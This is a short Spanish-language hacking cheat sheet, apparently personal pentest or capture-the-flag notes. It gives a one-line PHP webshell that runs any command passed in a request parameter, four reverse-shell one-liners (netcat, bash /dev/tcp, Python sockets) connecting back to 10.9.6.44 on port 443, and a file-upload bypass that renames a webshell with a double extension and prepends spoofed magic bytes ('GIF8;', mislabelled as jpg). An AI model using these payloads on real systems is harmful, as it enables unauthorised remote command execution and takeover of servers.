** cmd.php **
Para visualizar la webshell, desde navegador --> 10.10.10.100/cmd.php?cmd=whoami

```
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

** Payloads para ganar acceso al sistema **
`nc -e /bin/bash 10.9.6.44 443`

`bash -i >& /dev/tcp/10.9.6.44/443 0>&1`

`bash -c "bash -i >& /dev/tcp/10.9.6.44/443 0>&1"`

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.9.6.44",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'`

** Ataque de doble extensión para la subida de webshells **
Renombrar 'webshell.php' a 'webshell.php.jpg'
Añadir al principio del fichero las carácterísticas de un fichero jpg para que incruste los magic number --> GIF8;
Podemos comprobar los valores del fichero nuevo con hexeditor --> `hexeditor webshell.php.jpg`